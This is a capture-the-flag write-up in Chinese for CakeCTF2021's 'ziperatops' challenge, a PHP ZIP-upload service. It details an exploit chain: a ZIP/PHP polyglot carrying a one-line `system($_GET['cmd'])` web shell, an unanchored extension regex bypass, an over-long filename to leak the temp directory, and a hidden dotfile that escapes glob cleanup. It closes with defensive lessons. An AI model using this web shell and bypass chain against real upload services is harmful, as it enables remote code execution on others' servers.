# CakeCTF2021 ziperatops

## 题目简述

服务接收多个 ZIP，先验证每个临时文件能被 `ZipArchive` 打开、文件名只含有限字符且不含 `..`，再移动到 Web 根下的随机临时目录。扩展名正则 `/^.+\.zip/` 没有锚定结尾；清理函数使用的 glob 又不会匹配点号开头的隐藏文件。把两个缺陷与文件系统路径长度限制组合起来，可以留下可执行的 `.php` 文件。

## 解题过程

### 构造合法 ZIP 与 PHP polyglot

先创建任意最小 ZIP，再在 End of Central Directory 后追加 PHP：

```php
<?php system($_GET['cmd']); ?>
```

ZIP 解析器容忍归档末尾的附加数据，所以 `ZipArchive::open()` 仍然成功。将文件命名为：

```text
.king-kazuma.zip.php
```

它只含白名单允许的字符、不包含连续两个点，而且扩展名正则在中间的 `.zip` 处已经匹配成功。Web 服务器最终仍按末尾 `.php` 解释它。

### 用第二个文件中断流程并泄露目录名

在同一 multipart 请求中再上传一个有效 ZIP，文件名设为 4096 个 `A` 加 `.zip`。它能通过内容和正则校验，但 `move_uploaded_file` 因单个路径分量超过文件系统限制而失败。错误信息包含随机目录名：

```text
Failed to upload the file: <dname>/<very-long-name>.zip
```

第一个隐藏文件此时已经移动成功。错误路径调用：

```php
foreach (glob("temp/$dname/*") as $file)
    unlink($file);
```

默认 `*` 不匹配 `.king-kazuma.zip.php`，因此隐藏文件未被删除；目录非空，后面的 `rmdir` 也失败。

### 访问遗留 PHP 文件

从 HTML 错误中提取 40 位十六进制目录名，随后请求：

```text
/temp/<dname>/.king-kazuma.zip.php?cmd=cat%20/flag*.txt
```

响应前部可能混有 ZIP 原始字节，但 PHP 代码会执行并输出：

```text
CakeCTF{uNd3r5t4nd1Ng_4Nd_3xpl01t1Ng_f1l35y5t3m_cf1944}
```

## 方法总结

- 文件扩展名白名单必须锚定字符串末尾；“包含 `.zip`”与“最终扩展名是 `.zip`”不是同一条件。
- 文件格式检查应考虑 polyglot 和尾随数据，尤其不能让上传目录执行脚本。
- 清理逻辑、上传顺序、隐藏文件匹配和路径长度错误共同构成利用链；单独观察任一正则都无法解释完整结果。
